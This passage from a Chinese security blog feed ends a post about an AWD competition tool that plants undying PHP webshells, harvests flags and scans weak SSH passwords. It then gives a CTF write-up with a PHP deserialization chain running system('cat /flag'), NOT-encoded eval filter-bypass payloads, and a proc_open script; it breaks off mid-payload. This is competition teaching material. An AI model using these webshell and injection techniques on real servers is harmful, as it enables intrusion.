src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-10.png"></p><h3 id="通过随机马执行命令"><a href="#通过随机马执行命令" class="headerlink" title="通过随机马执行命令"></a>通过随机马执行命令</h3><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-11.png"></p><h3 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h3><blockquote><p>使用场景：批量获取窗口中的flag</p></blockquote><p>需要先通过执行<code>cat /flag</code>或<code>curl</code>获取到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-12.png"></p><p>点击获取flag按钮后，程序会自动在返回的结果中搜索包含<code>flag&#123;&#125;</code>的值并保存到<code>flag.txt</code>中</p><p>如果flag格式并不是<code>flag&#123;&#125;</code>，则可以自定义匹配的正则表达式</p><h2 id="提交flag"><a href="#提交flag" class="headerlink" title="提交flag"></a>提交flag</h2><blockquote><p>使用场景：批量获取到flag后自动访问提交接口进行提交flag</p></blockquote><p><strong>flag用*占位。多个参数用&amp;分割。注意在设置页中设置线程数，太大容易丢包</strong></p><p>Get方式：<code>http://192.168.100.103:4444/api/flag?token=xxxx&amp;flag=xxxx</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-13.png"></p><p>Post方式：</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-14.png"></p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><blockquote><p>使用场景：ssh弱口令</p></blockquote><p>比如裁判下发的ssh地址为<code>x.x.x.x:2222 密码：ctf@awd</code>，就可以知道所有队伍都是这个密码。而且有些比赛不设置防御时间，一开始就能连到其他队伍的ssh（这里就不得不提到某年的宁波市awd）</p><h4 id="ssh扫描"><a href="#ssh扫描" class="headerlink" title="ssh扫描"></a>ssh扫描</h4><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-15.png"></p><p>扫描结果会保存在<code>ssh.txt</code></p><h3 id="ssh密码更改"><a href="#ssh密码更改" class="headerlink" title="ssh密码更改"></a>ssh密码更改</h3><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-16.png"></p><h2 id="工具-amp-设置"><a href="#工具-amp-设置" class="headerlink" title="工具&amp;设置"></a>工具&amp;设置</h2><blockquote><p>使用场景：base64，url的编码与解码，行去重与清屏</p></blockquote><p>支持拖放文件</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-17.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rah/rah-18.png"></p><h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><p>V1.0：初始版本<br>V1.1：多种扫描方式，代码逻辑优化<br>V1.2：添加随机不死马功能，修复诺干bug<br>V2.1：70%代码重构，速度较上一代提升11倍。添加ssh和设置模块</p><p>可能将要做的：<br>1：希望加入pwn的批量攻击（貌似没多少比赛中有）<br>2：希望不止php的不死马（虽然大部分比赛php够用了）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;目标生成&quot;&gt;&lt;a href=&quot;#目标生成&quot; class=&quot;headerlink&quot; title=&quot;目标生成&quot;&gt;&lt;/a&gt;目标生成&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;使用场景：在目标扫描前如果没有下发靶机地址列表，则需要自己生成一份去扫描&lt;/p&gt;
&lt;/blockq</summary>
      
    
    
    
    <category term="项目" scheme="https://www.dr0n.top/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="awd" scheme="https://www.dr0n.top/tags/awd/"/>
    
    <category term="自动化" scheme="https://www.dr0n.top/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>第六届浙江省大学生网络与信息安全竞赛-WP</title>
    <link href="https://www.dr0n.top/posts/13f4d784/"/>
    <id>https://www.dr0n.top/posts/13f4d784/</id>
    <published>2023-11-11T04:00:00.000Z</published>
    <updated>2024-02-29T08:47:27.934Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="初赛-easy-php"><a href="#初赛-easy-php" class="headerlink" title="初赛[easy php]"></a>初赛[easy php]</h2><p>签到题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;done&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$param1</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__debuginfo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> [<br>            <span class="hljs-string">&#x27;debugInfo&#x27;</span> =&gt; <span class="hljs-string">&#x27;param1&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;param1<br>        ];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;func-&gt;<span class="hljs-title function_ invoke__">aaa</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">BBB</span>();<br><span class="hljs-variable">$a</span>-&gt;param1 = <span class="hljs-keyword">new</span> CCC;<br><span class="hljs-variable">$a</span>-&gt;param1-&gt;func = <span class="hljs-keyword">new</span> AAA;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><h2 id="初赛-can-you-read-flag"><a href="#初赛-can-you-read-flag" class="headerlink" title="初赛[can you read flag]"></a>初赛[can you read flag]</h2><blockquote><p>好像做复杂了</p></blockquote><p>访问页面返回<code>//eval($_GET[a]);</code></p><p>爆破一下看哪些符号能用</p><p>可以用取反，例如<code>(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></p><p>发现根目录有<code>flag</code>和<code>readflag</code>，flag没有权限读取</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-web1-1.png"></p><p>base64转一下读取readflag</p><p><code>(~%8C%86%8C%8B%9A%92)(~%9D%9E%8C%9A%C9%CB%DF%D0%8D%9A%9E%9B%99%93%9E%98);</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-web1-2.png"></p><p>执行readflag后要先输入一个<code>y</code>，然后进入循环开始计算式子，大概成功计算100多轮后读取flag并输出</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2023zjss-c-web1-3.png"></p><p>靶机的web目录不能读写，在&#x2F;tmp目录下写一个php脚本用来计算</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$desc</span>=<span class="hljs-keyword">array</span>(<br>        <span class="hljs-number">0</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>),<br>        <span class="hljs-number">1</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;pipe&quot;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<br>        <span class="hljs-number">2</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;file&quot;</span>,<span class="hljs-string">&quot;/tmp/error-output.txt&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>);<br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">proc_open</span>(<span class="hljs-string">&quot;/readflag&quot;</span>,<span class="hljs-variable">$desc</span>,<span class="hljs-variable">$handle</span>);<br><span class="hljs-title function_ invoke__">is_resource</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$wh</span>=<span class="hljs-variable">$handle</span>[<span class="hljs-number">0</span>];<br><span class="hljs-variable">$rh</span>=<span class="hljs-variable">$handle</span>[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$rh</span> <span class="hljs-subst">$wh</span> open\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$handle</span>);<br><span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2096</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$read</span>\n&quot;</span>;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$wh</span>,<span class="hljs-string">&#x27;y&#x27;</span>);<br><br><span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2048</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;read: &quot;</span>.<span class="hljs-variable">$read</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2048</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$i</span>:<span class="hljs-subst">$read</span>\n&quot;</span>;<br><span class="hljs-variable">$op</span>=<span class="hljs-string">&quot;\$value=&quot;</span>.<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">strtok</span>(<span class="hljs-variable">$read</span>,<span class="hljs-string">&quot; =&quot;</span>)).<span class="hljs-string">&#x27;;&#x27;</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$op</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$op</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$value</span>.<span class="hljs-string">&quot;\n&quot;</span>.<span class="hljs-variable">$op</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$wh</span>,<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$value</span>).PHP_EOL);<br><span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">200</span>)&#123;<br>    <span class="hljs-variable">$read</span>=<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$rh</span>,<span class="hljs-number">2048</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$i</span>:<span class="hljs-subst">$read</span>\n&quot;</span>;<br>    <span class="hljs-variable">$op</span>=<span class="hljs-string">&quot;\$value=&quot;</span>.<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">strtok</span>(<span class="hljs-variable">$read</span>,<span class="hljs-string">&quot; =&quot;</span>)).<span class="hljs-string">&#x27;;&#x27;</span>;<br><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$op</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$wh</span>,<span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$value</span>).PHP_EOL);<br>        <span class="hljs-variable">$i</span>++;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>C%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>C%<span class="hljs-number">8</span>B%<span class="hljs-number">9</span>A%<span class="hljs-number">92</span>)(~%D7%<span class="hljs-number">9</span>A%<span class="hljs-number">9</span>C%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%DF%DD%AF%BB%C6%<span class="hljs-number">88</span>%<span class="hljs-number">9</span>E%B7%BE%B1%BC%<span class="hljs-number">98</span>%CF%B4%B5%B8%AD%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>C%CD%B2%C6%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%BB%AE%<span class="hljs-number">90</span>%B5%B2%BB%CF%D4%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%B6%<span class="hljs-number">91</span>%BD%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>C%B8%AA%<span class="hljs-number">96</span>%B3%BC%<span class="hljs-number">9</span>B%<span class="hljs-number">86</span>%B5%<span class="hljs-number">86</span>%<span class="hljs-number">94</span>%<span class="hljs-number">8</span>C%BB%AE%<span class="hljs-number">90</span>%B5%B2%AB%CF%D4%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%B6%<span class="hljs-number">91</span>%BD%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>C%B8%AA%<span class="hljs-number">96</span>%B3%BC%<span class="hljs-number">9</span>B%CC%B5%<span class="hljs-number">86</span>%<span class="hljs-number">94</span>%<span class="hljs-number">8</span>C%BB%AE%<span class="hljs-number">90</span>%B5%B2%<span class="hljs-number">95</span>%CF%D4%A6%A7%B5%<span class="hljs-number">86</span>%A6%A7%<span class="hljs-number">94</span>%<span class="hljs-number">90</span>%B6%<span class="hljs-number">92</span>%A5%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>D%B8%AA%<span class="hljs-number">96</span>%B3%BC%B6%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>B%B8%CE%<span class="hljs-number">88</span>%B3%CD%A9%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%C6%<span class="hljs-number">86</span>%B3%A8%C6%CE%<span class="hljs-number">9</span>B%B7%BD%CE%<span class="hljs-number">9</span>B%BC%CA%CF%<span class="hljs-number">9</span>A%B7%AE%<span class="hljs-number">96</span>%B3%BC%<span class="hljs-number">9</span>B%<span class="hljs-number">97</span>%B5%<span class="hljs-number">86</span>%<span class="hljs-number">94</span>%B1%BC%<span class="hljs-number">96</span>%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%A6%AB%CE%<span class="hljs-number">88</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%C6%<span class="hljs-number">95</span>%A7%CD%C6%<span class="hljs-number">88</span>%A5%A8%CB%<span class="hljs-number">90</span>%B6%<span class="hljs-number">96</span>%C6%<span class="hljs-number">86</span>%A5%A8%B9%<span class="hljs-number">94</span>%A5%<span class="hljs-number">92</span>%<span class="hljs-number">87</span>%<span class="hljs-number">97</span>%A5%<span class="hljs-number">86</span>%B6%<span class="hljs-number">8</span>C%B5%B8%AD%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>C%CD%B2%<span class="hljs-number">8</span>C%B5%B8%<span class="hljs-number">97</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">92</span>%AD%<span class="hljs-number">8</span>C%A5%AC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>C%CE%C6%<span class="hljs-number">86</span>%A5%A7%B1%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>B%A7%B5%<span class="hljs-number">95</span>%A5%AC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%A6%AC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>B%CD%<span class="hljs-number">98</span>%C6%B5%B8%<span class="hljs-number">97</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">92</span>%AD%<span class="hljs-number">8</span>C%A5%A9%<span class="hljs-number">8</span>C%<span class="hljs-number">88</span>%A7%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%AD%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%BB%CF%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>E%B8%B9%<span class="hljs-number">8</span>A%A5%B8%<span class="hljs-number">87</span>%<span class="hljs-number">93</span>%A8%<span class="hljs-number">85</span>%B9%<span class="hljs-number">9</span>B%B0%<span class="hljs-number">88</span>%CF%B4%A5%A8%B1%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">86</span>%BE%<span class="hljs-number">96</span>%B5%B7%B5%<span class="hljs-number">90</span>%B6%BC%AD%CC%<span class="hljs-number">9</span>E%BC%BD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%B8%A9%<span class="hljs-number">8</span>A%A7%B8%CB%<span class="hljs-number">96</span>%B0%<span class="hljs-number">88</span>%CF%B4%<span class="hljs-number">9</span>B%<span class="hljs-number">92</span>%B9%<span class="hljs-number">86</span>%A7%CD%AD%CE%<span class="hljs-number">9</span>D%A7%BE%<span class="hljs-number">90</span>%B5%B8%<span class="hljs-number">97</span>%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">92</span>%AD%<span class="hljs-number">8</span>C%A5%AC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%CE%<span class="hljs-number">92</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B2%<span class="hljs-number">95</span>%BE%CA%B1%<span class="hljs-number">96</span>%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%A6%CD%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%B6%BC%B6%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%B9%<span class="hljs-number">87</span>%<span class="hljs-number">8</span>A%B6%<span class="hljs-number">95</span>%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">92</span>%A5%CC%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">93</span>%CF%A5%AC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>B%CD%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B5%CC%<span class="hljs-number">94</span>%<span class="hljs-number">91</span>%B4%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">98</span>%CF%B4%B5%B7%B5%<span class="hljs-number">93</span>%A6%A8%AE%C6%A5%<span class="hljs-number">91</span>%B5%<span class="hljs-number">93</span>%A6%A8%AE%<span class="hljs-number">90</span>%B5%B7%B5%<span class="hljs-number">90</span>%B3%BB%B6%<span class="hljs-number">88</span>%B1%BB%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>F%B0%<span class="hljs-number">88</span>%CF%B4%A5%A8%B1%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">86</span>%BE%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%<span class="hljs-number">96</span>%CB%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%CB%<span class="hljs-number">96</span>%A7%B8%CB%<span class="hljs-number">96</span>%B0%<span class="hljs-number">88</span>%CF%B4%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%CE%<span class="hljs-number">92</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B2%<span class="hljs-number">95</span>%BE%CF%B0%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%A6%CD%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%B6%BC%B6%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>E%AB%<span class="hljs-number">90</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%B9%<span class="hljs-number">87</span>%<span class="hljs-number">8</span>A%B6%<span class="hljs-number">95</span>%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BB%CF%<span class="hljs-number">96</span>%A7%BC%AD%CD%A6%A8%<span class="hljs-number">87</span>%CE%A5%AB%CF%<span class="hljs-number">96</span>%B3%<span class="hljs-number">91</span>%AD%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%A8%CF%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>C%CC%AD%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>B%B8%C6%<span class="hljs-number">8</span>D%B4%BC%AD%<span class="hljs-number">86</span>%A5%A8%B9%<span class="hljs-number">94</span>%B3%BC%B6%<span class="hljs-number">98</span>%AF%AC%B6%<span class="hljs-number">8</span>F%B4%AC%CB%<span class="hljs-number">91</span>%B0%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>C%C8%BB%AE%<span class="hljs-number">90</span>%B1%BC%<span class="hljs-number">92</span>%A9%<span class="hljs-number">95</span>%<span class="hljs-number">9</span>E%B8%C7%<span class="hljs-number">98</span>%B5%B8%C6%<span class="hljs-number">88</span>%B3%<span class="hljs-number">96</span>%B5%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>D%<span class="hljs-number">96</span>%B6%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">92</span>%B9%<span class="hljs-number">8</span>C%B4%BC%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">8</span>F%<span class="hljs-number">93</span>%A6%CD%<span class="hljs-number">97</span>%<span class="hljs-number">89</span>%B6%BC%AD%CD%A6%A8%<span class="hljs-number">87</span>%CE%A5%AC%CB%<span class="hljs-number">96</span>%A7%B8%CB%<span class="hljs-number">96</span>%B3%<span class="hljs-number">96</span>%AD%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>C%BC%CB%<span class="hljs-number">96</span>%A7%B8%CB%<span class="hljs-number">96</span>%B0%<span class="hljs-number">88</span>%CF%B4%A5%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">86</span>%<span class="hljs-number">9</span>E%A7%AD%<span class="hljs-number">93</span>%B4%BC%AD%CC%<span class="hljs-number">9</span>E%BC%<span class="hljs-number">87</span>%<span class="hljs-number">85</span>%<span class="hljs-number">9</span>B%B7%B5%CD%A6%A8%<span class="hljs-number">88</span>%<span class="hljs-number">90</span>%B5%B7%A5%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%B7%A9%<span class="hljs-number">93</span>%B4%AC%CA%AE%AC%B9%BD%<span class="hljs-number">99</span>%AD%AA%C6%B2%B4%AB%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%AD%<span class="hljs-number">8</span>F%AF%AB%BE%C8%BB%AE%<span class="hljs-number">8</span>F%CC%<span class="hljs-number">9</span>E%B8%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>C%A5%AC%BE%<span class="hljs-number">90</span>%B5%B8%<span class="hljs-number">94</span>%C7%B2%<span class="hljs-number">95</span>%BE%<span class="hljs-number">88</span>%B4%A7%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%BE%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BB%CE%<span class="hljs-number">92</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%A9%<span class="hljs-number">97</span>%A5%BC%<span class="hljs-number">98</span>%<span class="hljs-number">94</span>%<span class="hljs-number">9</span>C%<span class="hljs-number">92</span>%<span class="hljs-number">98</span>%<span class="hljs-number">8</span>C%B2%<span class="hljs-number">95</span>%BE%CF%B0%BC%<span class="hljs-number">94</span>%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%A5%A8%B1%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>D%<span class="hljs-number">86</span>%BE%<span class="hljs-number">96</span>%B5%B8%<span class="hljs-number">94</span>%C9%B5%B7%B5%<span class="hljs-number">93</span>%A6%A8%AD%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>D%<span class="hljs-number">96</span>%B6%C8%BB%AE%<span class="hljs-number">90</span>%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%B5%B8%C6%<span class="hljs-number">88</span>%AF%AC%B5%<span class="hljs-number">9</span>C%B5%B7%A5%<span class="hljs-number">97</span>%<span class="hljs-number">9</span>D%B7%A9%<span class="hljs-number">93</span>%AF%AC%B6%<span class="hljs-number">8</span>A%<span class="hljs-number">9</span>B%B7%B5%<span class="hljs-number">8</span>F%<span class="hljs-number">9</span>D%AC%<span class="hljs-number">97</span>%<span class="hljs-number">85</span>%<span class="hljs-number">9</span>B%B7%B5%CF%<span class="hljs-number">9</span>D%CD%<span class="hljs-number">8</span>C%<span class="hljs-number">90</span>%B5%B7%B5%<span class="hljs-number">93</span>%A6%A8%AE%<span class="hljs-number">8</span>C%B6%<span class="hljs-number">96</span>%BE%C6%B6%<span class="hljs-number">96</span>%<span class="hljs-number">94</span>%<span class="hljs-number">8</span>F%B3%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>C%C8%B5%<span class="hljs-number">85</span>%<span class="hljs-number">8</span>C%B1%BC%<span class="hljs-number">96</span>%BE%<span class="hljs-number">98</span>%B6%BC%BE%<span class="hljs-number">98</span>%B6%BC%BE%B1%BC%<span class="hljs-number">96</span>%BE%<span class="hljs-number">98</span>%B6%BC%BD%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>B%<span class="hljs-number">92</span>%B9%<span class="hljs-number">8</span>C%B4%BC%AD%<span 